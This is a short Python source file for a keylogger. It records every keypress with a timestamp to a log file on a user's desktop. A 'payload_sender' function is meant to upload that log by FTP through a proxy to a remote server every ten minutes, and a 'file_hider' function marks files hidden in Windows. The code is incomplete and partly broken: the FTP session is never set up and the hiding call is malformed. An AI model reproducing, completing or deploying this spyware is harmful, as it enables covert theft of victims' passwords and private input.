import ftplib
import subprocess
import time
from pynput import keyboard

def logger(key):
    # Creates .txt file and logs all inputs
    with open(f"C:\\Users\\JohnBradshawCantos\\Desktop\\log.txt", "a") as file:
        file.write(f"{time.asctime()}: {key}\n".replace("'", ""))
    file.close()
    
    # Escaping when esc is pressed
    if key == keyboard.Key.esc:
        listener.stop()

with keyboard.Listener(on_press=logger) as listener:
    listener.join()

# Every 10 mins sends log.txt using FTP
def payload_sender(file, proxy_address, proxy_port, proxy_username, proxy_pass, server_address, server_port, server_username, server_password):
        
    payload = open(f"{file}", "r")                                      
    session.storbinary(f"STOR {file}", payload)                         # Sending file
    payload.close()
    session.quit()

# To not have too many troubles while  
# Rewriting here the same module from sysrunn3r (file hider)
def file_hider(item):
    subprocess.run("attrib", "+H", f"{item}")